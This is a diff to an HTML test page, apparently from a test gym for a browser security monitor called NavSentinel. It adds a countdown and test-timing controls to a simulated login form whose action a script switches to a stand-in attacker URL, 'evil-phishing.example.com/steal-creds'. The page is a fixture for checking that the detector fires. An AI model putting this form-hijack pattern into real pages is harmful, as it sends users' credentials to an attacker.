@@ -41,11 +41,16 @@
   <h1>Mutation 02 - Form Action Change</h1>
   <div class="description">
     <strong>Attack scenario:</strong> A login form starts with a legitimate action URL.
-    After 3 seconds, a script changes the form's action to a cross-domain URL controlled
+    After the page-load fallback timer, a script changes the form's action to a cross-domain URL controlled
     by the attacker. When the user submits, their credentials go to the attacker.
     <br><br>
     <strong>Expected:</strong> NavSentinel mutation monitor detects the form action change
     and fires a <code>form_action_changed</code> alert.
+    <br><br>
+    <strong>Human fallback:</strong> Leave this page open and follow the visible countdown;
+    no click is needed. The form action changes automatically when the fallback countdown reaches zero.
+    <strong>E2E-only:</strong> automated tests may dispatch the monitor-ready event below;
+    humans should not use that event.
   </div>
 
   <form id="login-form" action="/api/auth/login" method="POST">
@@ -55,13 +60,30 @@
     <button type="submit">Sign In</button>
   </form>
 
-  <div id="status" class="status-pending">
-    Status: Form action is currently "/api/auth/login". Waiting for the monitor-ready trigger...
+  <div id="timing" class="status-pending" aria-live="polite"></div>
+  <div id="status" class="status-pending" aria-live="polite">
+    Status: Form action is currently "/api/auth/login". Waiting for the E2E-only monitor-ready event or the human fallback timer...
   </div>
 
   <script>
+    const HUMAN_FALLBACK_DELAY_MS = 10_000;
+    const TEST_DELAY_QUERY = "gymTestDelayMs";
+    const testDelay = Number(new URLSearchParams(location.search).get(TEST_DELAY_QUERY));
+    const hasBoundedTestDelay = Number.isInteger(testDelay) && testDelay > 0 && testDelay <= 5_000;
+    const fallbackDelayMs = hasBoundedTestDelay ? testDelay : HUMAN_FALLBACK_DELAY_MS;
+    const fallbackStartedAt = Date.now();
+    const timing = document.getElementById("timing");
     var changed = false;
-    function changeFormAction() {
+    function updateCountdown() {
+      if (changed || !timing) return;
+      const remainingMs = Math.max(0, fallbackDelayMs - (Date.now() - fallbackStartedAt));
+      const seconds = Math.ceil(remainingMs / 1000);
+      timing.textContent = hasBoundedTestDelay
+        ? `E2E-only bounded timer override: automatic fallback in ${seconds} second${seconds === 1 ? "" : "s"}.`
+        : `Human fallback countdown: automatic form-action change in ${seconds} second${seconds === 1 ? "" : "s"}.`;
+      if (remainingMs > 0) window.setTimeout(updateCountdown, Math.min(1000, remainingMs));
+    }
+    function changeFormAction(source) {
       if (changed) return;
       changed = true;
       var form = document.getElementById("login-form");
@@ -69,11 +91,13 @@
 
       document.getElementById("status").textContent =
         'Status: Form action changed to "https://evil-phishing.example.com/steal-creds". ' +
-        "NavSentinel should fire form_action_changed alert.";
+        `NavSentinel should fire form_action_changed alert (source: ${source === "e2e" ? "E2E-only monitor-ready event" : "human fallback timer"}).`;
       document.getElementById("status").className = "status-triggered";
+      if (timing) timing.textContent = `Change source: ${source === "e2e" ? "E2E-only monitor-ready event" : "human fallback timer"}.`;
     }
-    window.addEventListener("navsentinel:gym:trigger-mutation", changeFormAction, { once: true });
-    setTimeout(changeFormAction, 10000);
+    window.addEventListener("navsentinel:gym:trigger-mutation", () => changeFormAction("e2e"), { once: true });
+    updateCountdown();
+    window.setTimeout(() => changeFormAction("timer"), fallbackDelayMs);
   </script>
 </body>
 </html>
